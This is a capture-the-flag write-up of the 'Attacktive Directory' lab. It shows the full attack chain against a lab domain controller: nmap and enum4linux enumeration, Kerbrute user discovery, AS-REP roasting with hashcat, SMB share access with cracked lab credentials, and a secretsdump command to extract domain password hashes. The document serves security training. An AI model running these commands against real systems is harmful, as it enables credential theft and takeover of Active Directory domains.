# Attacktive Directory

## Setup

### Installing Impacket:

Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install correctly. Here's some instructions that may help you install it correctly!

:warning:**Note: All of the tools mentioned in this task are installed on the AttackBox already. These steps are only required if you are setting up on your own VM. Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with `python3.9 <your-command>` .**

First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:

`git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`

After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.

To install the Python requirements for Impacket:

`pip3 install -r /opt/impacket/requirements.txt`

Once the requirements have finished installing, we can then run the python setup install script:

`cd /opt/impacket/ && python3 ./setup.py install`

After that, Impacket should be correctly installed now and it should be ready to use!

_If you are still having issues, you can try the following script and see if this works:_

`sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket`

`sudo pip3 install -r /opt/impacket/requirements.txt`

`cd /opt/impacket/`&#x20;

`sudo pip3 install .`&#x20;

`sudo python3 setup.py install`

### Installing Bloodhound and Neo4j

Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:

`apt install bloodhound neo4j`

Now that it's done, you're ready to go!

### Troubleshooting

If you are having issues installing Bloodhound and Neo4j, try issuing the following command:

`apt update && apt upgrade`

## Welcome to Attacktive Directory

:information\_source:Notes: Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\User at the Window's login prompt) and Administrator via Evil-WinRM.

We start by adding the IP address of our machine to the /etc/hosts

```bash
echo 10.10.8.177 spookysec.local >> /etc/hosts
```

## Enumeration

Basic nmap scan to discover what we are working with:

```bash
nmap -A -p- -v -sC spookysec.local -Pn 
```

From this scan we discover the Domain Name of the machine as well as the the full AD domain:

```
Nmap scan report for spookysec.local (10.10.8.177)
Host is up (0.068s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-19 11:20:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T10:55:05
| Not valid after:  2024-07-19T10:55:05
| MD5:   cab1:3669:b3fc:b317:1fd6:af14:259a:fc3f
|_SHA-1: df4e:a023:1424:25ff:6611:916c:6646:abf7:cf3c:041c
|_ssl-date: 2024-01-19T11:21:56+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-19T11:21:46+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/19%OT=53%CT=1%CU=32577%PV=Y%DS=2%DC=T%G=Y%TM=65AA
OS:5B56%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%
OS:TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8
OS:NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R
OS:=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%
OS:CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-19T11:21:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

* NetBIOS\_Computer\_Name: ATTACKTIVEDIREC
* NetBIOS\_Domain\_Name: THM-AD
* DNS\_Domain\_Name: spookysec.local
* DNS\_Computer\_Name: AttacktiveDirectory.spookysec.local

Using Metasploit we can confirm the SMB version used:

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>



{% hint style="warning" %}
The use of ".local" domains for Active Directory is discouraged primarily due to potential conflicts with multicast Domain Name System (mDNS) and name resolution services used in local networks. In the past, the ".local" extension was widely used for local networks and seemed like a convenient choice for Active Directory implementations. However, this led to issues when multicast Domain Name System (mDNS) resolution became more prevalent.

mDNS is used for name resolution on local networks without the need for a centralized DNS server. When a domain ends with ".local," it may interfere with mDNS requests and cause conflicts in name resolution, especially in mixed environments with non-Windows devices.

Another reason is that the ".local" suffix has been later reserved for use by Zeroconf and the mDNS standard. The Internet Engineering Task Force (IETF) recommended using registered top-level domains to ensure there are no conflicts with new standards and protocols.

Instead, it is recommended to use a valid top-level domain, such as "company.local" or "ad.company.com." This not only avoids potential name resolution conflicts but also aligns better with best practices and domain naming standards on the Internet.\
\
The Internet Engineering Task Force (IETF) reserves the use of the domain name label _.local_ as a special-use domain name for hostnames in local area networks that can be resolved via the Multicast DNS name resolution protocol. Any DNS query for a name ending with the label _local_ must be sent to the mDNS IPv4 link-local multicast address _224.0.0.251_, or its IPv6 equivalent _ff02::fb_. A domain name ending in _.local_ may be resolved concurrently via other mechanisms, for example, unicast DNS.
{% endhint %}

### Enumerating SMB

Using enum4linux we are able to enumerate ports 139 and 445.

```bash
enum4linux -a -A spookysec.local
```

<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

### Enumerating Kerberos

A whole host of other services are running, including Kerberos. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called Kerbrute (by Ronnie Flathers @ropnop) to brute force discovery of users, passwords and even password spray!

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

```bash
kerbrute userenum userlist.txt --dc spookysec.local -d spookysec.local
```

Two notable accounts are discovered: `svc-admin` & `backup`:

<figure><img src="../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>

## Exploitation

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called <mark style="color:orange;">**ASREPRoasting**</mark>. ASReproasting occurs when a user account has the privilege '<mark style="color:orange;">**Do not require Kerberos preauthentication**</mark>' set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

We can try to use `GetNPUsers.py` to export their TGTs for cracking:

```bash
GetNPUsers.py spookysec.local/svc-admin
```

<figure><img src="../../.gitbook/assets/image (231).png" alt=""><figcaption></figcaption></figure>

Now we can try to crack it using the password list provided in the challenge resources.

1.  Save the hash of TGT in a file:\


    <figure><img src="../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>
2.  Find the method to use with `hashcat` based on our hash file format:\


    <figure><img src="../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>
3.  Crack it: `hashcat -m 18200 -a 0 hashes.asreproast passwordlist.txt`\


    <figure><img src="../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

## Enumeration (again)

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

We can use `crackmapexec` to map remote SMB shares:

```bash
crackmapexec smb spookysec.local -u svc-admin -p 'management2005' --shares
```

<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

Or other tools like `smbmap`:

{% hint style="success" %}
`smbmap` has a beatiful feature with option `-r` to list recursively all the contents in shares!
{% endhint %}

```bash
smbmap -H spookysec.local -u svc-admin -p management2005 
```

<figure><img src="../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

or simply `smbclient`:

```bash
smbclient -U 'spookysec.local\svc-admin' --password 'management2005' -L \\\\spookysec.local\\
```

<figure><img src="../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

We find a very useful txt file:

<figure><img src="../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

Download the file locally:

```bash
smbmap --download backup/backup_credentials.txt -H spookysec.local -u svc-admin -p management2005
```

<figure><img src="../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

Using Cyberchef Magic feature we can identify easily the encoding algorith used (is Base64) and also the decoded output:

{% hint style="info" %}
The **Magic** operation attempts to detect various properties of the input data and suggests which operations could help to make more sense of it.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>

`backup@spookysec.local:backup2517860`

## Privilege Escalation

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking.&#x20;

:question:What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

Using Impacket tool called secretsdump.py:

```bash
secretsdump.py spookysec.local/backup:backup2517860@spookysec.local -j
```

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>
